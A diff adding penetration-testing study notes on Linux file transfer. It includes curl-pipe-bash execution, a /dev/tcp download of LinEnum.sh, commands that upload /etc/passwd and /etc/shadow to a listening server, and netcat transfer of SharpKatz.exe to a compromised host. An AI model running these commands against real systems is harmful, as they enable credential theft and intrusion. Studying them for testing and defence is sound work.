@@ -1,0 +1,65 @@
+```shell-session
+wget url -O /output_file
+```
+```shell-session
+curl -o /output_file url
+```
+
+**Fileless dowload**
+curl or wget | (pipe) bash
+
+**Download with Bash (/dev/tcp)**
+```shell-session
+connect to the targer webserver
+ lin> exec 3<>/dev/tcp/10.10.10.32/80
+
+HTTP GET request
+ lin> echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
+print the response
+ lin>  cat <&3
+```
+
+**ssh**
+```shell-session
+scp username@ip:/source_path /dest_path  (download)
+					or
+scp soure_path username@ip:/dest_path    (upload)
+```
+
+**WEB upload**
+
+```shell-session
+ sudo python3 -m pip install --user uploadserver
+
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+curl -X POST https://ip/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure (multiple files)
+```
+
+**By Using Prgming Lang**
+```shell-session
+python2.7 -c 'import urllib;urllib.urlretrieve ("url")'
+```
+```shell-session
+python3 -c 'import urllib.request;urllib.request.urlretrieve("url")'
+```
+```shell-session
+php -r '$file = file_get_contents("url");file_put_contents("LinEnum.sh",$file);'
+```
+
+uploading by using peograming language
+```shell-session
+ python3 -c 'import requests;requests.post("http://IP:Port/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+
+**BY Using NetCat**
+```shell-session
+receiveing file to a compromised host listening on 8000
+ nc -l -p 8000 > SharpKatz.exe
+sending file to the compromised host
+ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+```
